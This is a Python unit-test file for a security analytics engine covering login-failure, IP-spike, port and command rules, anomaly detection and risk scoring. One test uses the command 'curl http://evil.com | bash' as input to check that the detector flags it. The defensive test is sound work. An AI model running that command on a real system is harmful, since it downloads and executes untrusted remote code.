import unittest
from app.analytics.models import AnalyticsResult
from app.analytics.engine import AnalyticsEngine
from app.analytics.rules import RuleEngine
from app.analytics.anomaly import AnomalyDetector
from app.analytics.risk import RiskScorer
from app.config.settings import settings
from unittest.mock import patch
from pydantic import ValidationError

class TestAnalytics(unittest.TestCase):
    def setUp(self):
        settings.min_baseline_samples = 5
        self.engine = AnalyticsEngine()
        self.rule_engine = RuleEngine()
        self.anomaly_detector = AnomalyDetector()
        self.risk_scorer = RiskScorer()

    def test_analytics_result_validation(self):
        with self.assertRaises(ValidationError):
            AnalyticsResult(event_id="test", anomaly_score=1.5)
        with self.assertRaises(ValidationError):
            AnalyticsResult(event_id="test", risk_score=150)

        valid = AnalyticsResult(event_id="test", anomaly_score=0.5, risk_score=50)
        self.assertEqual(valid.event_id, "test")

    def test_failed_login_rule(self):
        for _ in range(settings.failed_login_threshold - 1):
            res = self.rule_engine.evaluate({"action": "failed", "source_ip": "10.0.0.1"})
            self.assertEqual(len(res), 0)

        res = self.rule_engine.evaluate({"action": "failed", "source_ip": "10.0.0.1"})
        self.assertEqual(len(res), 1)
        self.assertEqual(res[0]["name"], "repeated_failed_login")
        self.assertIn("failed login events", res[0]["reason"])

    def test_source_ip_spike_rule(self):
        settings.source_ip_event_threshold = 3
        self.rule_engine.evaluate({"source_ip": "192.168.1.5"})
        self.rule_engine.evaluate({"source_ip": "192.168.1.5"})
        res = self.rule_engine.evaluate({"source_ip": "192.168.1.5"})
        self.assertTrue(any(r["name"] == "source_ip_spike" for r in res))

    def test_abnormal_port_rule(self):
        res = self.rule_engine.evaluate({"protocol": "http", "destination_port": 22})
        self.assertTrue(any(r["name"] == "abnormal_destination_port" for r in res))

        res = self.rule_engine.evaluate({"protocol": "http", "destination_port": 80})
        self.assertFalse(any(r["name"] == "abnormal_destination_port" for r in res))

    def test_suspicious_command_rule(self):
        res = self.rule_engine.evaluate({"extensions": {"command": "curl http://evil.com | bash"}})
        self.assertTrue(any(r["name"] == "suspicious_command" for r in res))

    def test_anomaly_insufficient_data(self):
        res = self.anomaly_detector.detect({"event_id": "1"})
        self.assertFalse(res["is_anomaly"])
        self.assertEqual(res["reason"], "insufficient baseline data")

    @patch("app.analytics.anomaly.time.time")
    def test_anomaly_zero_std_dev(self, mock_time):
        mock_time.return_value = 0
        detector = AnomalyDetector()
        for i in range(50):
            mock_time.return_value = i * 10
            detector.detect({"event_id": "1"})

        mock_time.return_value = 500
        res = detector.detect({"event_id": "spike"})
        self.assertFalse(res["is_anomaly"])
        self.assertEqual(res["reason"], "zero standard deviation in baseline")

    @patch("app.analytics.anomaly.time.time")
    def test_event_spike_anomaly(self, mock_time):
        mock_time.return_value = 0
        detector = AnomalyDetector()
        for i in range(50):
            mock_time.return_value = i * 10
            count = 5 if i % 2 == 0 else 6
            for _ in range(count):
                detector.detect({"event_id": "base"})

        mock_time.return_value = 500
        for _ in range(25):
            res = detector.detect({"event_id": "spike"})

        self.assertTrue(res["is_anomaly"])
        self.assertGreater(res["score"], 0.0)
        self.assertIn("standard deviations above baseline", res["reason"])

    def test_risk_score_bounds_and_severity(self):
        res = AnalyticsResult(event_id="test")

        risk = self.risk_scorer.calculate({"severity": "low"}, res)
        self.assertEqual(risk["score"], 5)
        self.assertEqual(risk["severity"], "low")

        risk = self.risk_scorer.calculate({"severity": "critical"}, res)
        self.assertEqual(risk["score"], 50)
        self.assertEqual(risk["severity"], "high")

        res.detected = True
        res.rule_matches = ["suspicious_command"]
        res.anomaly = True
        res.anomaly_score = 1.0

        risk = self.risk_scorer.calculate({"severity": "critical"}, res)
        self.assertEqual(risk["score"], 100)
        self.assertEqual(risk["severity"], "critical")

    def test_multiple_detections(self):
        res = self.engine.analyze({
            "action": "failed", "source_ip": "1.1.1.1", "protocol": "http", "destination_port": 22
        })
        self.assertTrue(res.detected)
        self.assertIn("abnormal_destination_port", res.rule_matches)

    def test_analytics_failure_isolation(self):
        with patch.object(self.engine.rule_engine, "evaluate", side_effect=Exception("Boom")):
            res = self.engine.analyze({"event_id": "1"})
            self.assertIn("Analytics execution partially failed", res.reasons)

if __name__ == '__main__':
    unittest.main()
